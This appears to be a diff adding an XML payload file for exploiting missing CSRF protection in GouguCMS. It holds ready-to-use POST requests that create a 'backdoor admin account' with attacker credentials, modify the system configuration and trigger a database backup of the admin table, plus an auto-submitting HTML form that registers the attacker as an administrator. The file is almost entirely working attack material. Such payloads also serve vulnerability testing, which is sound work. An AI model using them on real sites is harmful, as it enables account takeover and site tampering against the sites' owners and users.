@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- GouguCMS CSRF Protection Missing - Affected Operations -->
+<payloads>
+    <payload type="csrf_create_admin">
+        <url>/admin/admin/add</url>
+        <method>POST</method>
+        <headers>
+            <header>X-Requested-With: XMLHttpRequest</header>
+        </headers>
+        <body>username=attacker&pwd=EvilP@ssw0rd&nickname=Hacker&group_id[]=1</body>
+        <description>Create a backdoor admin account without CSRF token</description>
+    </payload>
+    <payload type="csrf_modify_config">
+        <url>/admin/conf/edit</url>
+        <method>POST</method>
+        <headers>
+            <header>X-Requested-With: XMLHttpRequest</header>
+        </headers>
+        <body>id=1&title=Hacked</body>
+        <description>Modify system configuration without CSRF token</description>
+    </payload>
+    <payload type="csrf_backup_database">
+        <url>/admin/database/backup</url>
+        <method>POST</method>
+        <headers>
+            <header>X-Requested-With: XMLHttpRequest</header>
+        </headers>
+        <body>tables[]=cms_admin</body>
+        <description>Trigger database backup without CSRF token</description>
+    </payload>
+    <exploit>
+        <html_csrf>
+            <![CDATA[
+<form action="http://target/admin/admin/add" method="POST" id="csrf">
+    <input name="username" value="attacker">
+    <input name="pwd" value="p@ssw0rd">
+    <input name="group_id[]" value="1">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+            ]]>
+        </html_csrf>
+    </exploit>
+</payloads>
